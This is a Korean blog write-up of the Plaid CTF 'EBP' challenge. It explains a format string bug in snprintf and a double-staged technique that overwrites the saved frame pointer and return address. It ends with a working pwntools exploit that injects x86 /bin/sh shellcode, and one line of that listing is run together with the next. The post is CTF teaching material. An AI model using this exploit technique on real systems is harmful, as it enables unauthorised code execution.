---
layout: post
title: ! "Plaid CTF EBP Writeup"
excerpt_separator: <!--more-->
comments : true
tags:
  - Writeup
  - CTF
  - Plaid CTF
  - t4ngo
---

ctf 문제를 많이 풀어보지는 못했지만 plaid ctf에서 괜찮은 문제가 많은 것 같아 찾아보던 중 EBP라는 문제가 재밌어보여서 포스팅하게 되었습니다!

사실 이번 문제는 FSB(Format String Bug)에 관한 것인데 3년전 문제이기도 하고 요즘은 FSB가 많이 나오지 않는 추세로 알고 있어서 '이걸 아직도 해?' 라고 하시는 분들도 계실 수 있지만 그래도 과거가 있기에 현재가 있는 법! 저와 같이 EBP 문제를 풀며 FSB를 다시 한 번 복습해봅시다!

<!--more>

먼저 Binary를 실행하면 아래와 같이 그냥 입력을 받고 그대로 출력해주는 동작이 끝입니다.

![]({{ site.baseurl }}/images/t4ngo/plaidctf_ebp_wirteup/plaidctf_ebp_writeup_01.PNG)  

그럼, 좀 더 자세히 알아보기 위해 IDA로 까봅시다!

![]({{ site.baseurl }}/images/t4ngo/plaidctf_ebp_wirteup/plaidctf_ebp_writeup_02.PNG)  

main에서는 buf에 1024byte만큼 입력을 받고 echo() 함수를 호출합니다.

![]({{ site.baseurl }}/images/t4ngo/plaidctf_ebp_wirteup/plaidctf_ebp_writeup_03.PNG)  

ehco() 함수는 make_response() 함수를 호출하고 puts()로 response를 출력합니다.

![]({{ site.baseurl }}/images/t4ngo/plaidctf_ebp_wirteup/plaidctf_ebp_writeup_04.PNG)  

make_response() 함수를 보면 snprintf()를 이용하여 buf의 값을 response에 복사하여 주는 것을 알 수 있습니다.

위 코드를 보고 make_response() 함수에 FSB가 존재한다는 것을 알아채셨겠죠? 하지만, 일반적인 FSB와는 달리 buf가 스택 영역이 아니기 때문에 스택을 마음대로 조작하기에는 어려운 부분이 있죠!

이를 해결하기 위해 Double Staged FSB라는 기법을 이용합니다. (위 내용은 <http://kblab.tistory.com/271>에 잘 정리가 되어 있어서 참고하시면 좋을 것 같습니다!)

다음으로 snprintf()가 호출되기 직전의 stack 상황을 살펴봅니다.

![]({{ site.baseurl }}/images/t4ngo/plaidctf_ebp_wirteup/plaidctf_ebp_writeup_05.PNG)  

ebp를 확인해보면 0xffffd5b8 위치하여 0xffffd5d8을 가리키고 있습니다. 여기서 당연하게도 0xffffd5d8은 이전 함수 프레임의 ebp를 뜻하겠죠? >_0

그런 다음, 0xffffd5d8 위치를 살펴보면 0xffffd5f8 들어있는 것을 알 수 있습니다. 즉, 이전 함수의 SFP는 0xffffd5f8이라는 사실을 알 수 있습니다. 그리고 이전 함수의 ret는 0xffffd5dc에 위치한 0x08048557이 되겠죠?

여기서 현재 함수의 EBP를 이용하여 이전 함수의 SFP 값을 0xffffd5dc로 바꾸어주면 됩니다.

정리하자면..

1. 현재 함수의 ebp를 이용하여 이전 함수의 SFP 변경
2. 변경된 SFP는 ret를 가리키고 있으므로 컨트롤 가능

그렇다면 이제 FSB를 이용하여 EBP 값이 얼마나 떨어져있는지 확인해 봅시다!

![]({{ site.baseurl }}/images/t4ngo/plaidctf_ebp_wirteup/plaidctf_ebp_writeup_06.PNG)  

4번째에 0xffffd5f8이 찍히긴 하지만 우리가 확인한 0xffffd5d8이 아닌 0xffffd5f8이 들어있습니다! 하지만, ret는 제대로 나오는 군요! 아마, 실제 메모리에 올라가면서 살짝 뒤로 밀린 것 같네요! O_O

그렇다면 다음과 같은 시나리오를 짤 수 있습니다!

1. %x%x%x%x으로 이전 함수의 SFP 확인
2. 알아낸 ebp+4를 통해 ret가 저장된 주소 계산
3. ret가 저장된 주소로 이전 함수의 SFP OverWrite (shellcode를 넣을 수 있는 곳 확보)
4. shellcode를 저장
5. shellcode가 저장된 곳으로 ret OverWrite

위와 같은 시나리오를 바탕으로 exploit 코드를 짜면 아래와 같습니다!

```
  1 from pwn import *
  2 import struct
  3 
  4 p = process("./ebp_a96f7231ab81e1b0d7fe24d660def25a.elf")
  5 
  6 p.send('%4$x\n')
  7 sleep(1)
  8 leak_addr = p.recv(1024)
  9 leak_addr = int(leak_addr,16)+4 & 0xffff
 10 
 11 payload = '%'+`leak_addr`+'c%4$hn\n'
 12 p.send(payload)
 13 
 14 p.recv(1024)shellcode = '\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
 16 payload = shellcode+'%'+`(0xa080-len(shellcode))`+'c%12$hn\n'
 17 p.send(payload)
 18 p.recv(1024)
 19 
 20 p.interactive()

```
![]({{ site.baseurl }}/images/t4ngo/plaidctf_ebp_wirteup/plaidctf_ebp_writeup_07.PNG)  

exploit 성공!!! 수고하셨습니당~~
